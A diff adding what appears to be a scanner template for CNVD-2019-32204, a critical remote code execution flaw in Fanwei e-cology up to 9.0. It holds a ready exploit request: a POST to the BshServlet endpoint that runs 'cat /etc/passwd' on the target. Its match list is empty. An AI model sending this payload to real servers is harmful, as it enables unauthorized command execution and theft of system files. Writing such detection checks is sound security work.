@@ -1,0 +1,21 @@
+id: CNVD-2019-32204
+brief:
+    title: Fanwei e-cology <=9.0 - Remote Code Execution
+    by: daffainfo
+    level: critical
+    about: Fanwei e-cology <=9.0 is susceptible to remote code execution vulnerabilities. Remote attackers can directly execute arbitrary commands on the target server by invoking the unauthorized access prob...
+    label:
+        - cnvd
+        - cnvd2019
+        - fanwei
+        - rce
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/bsh.servlet.BshServlet'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: bsh.script=exec("cat+/etc/passwd");&bsh.servlet.output=raw
+      signs: []
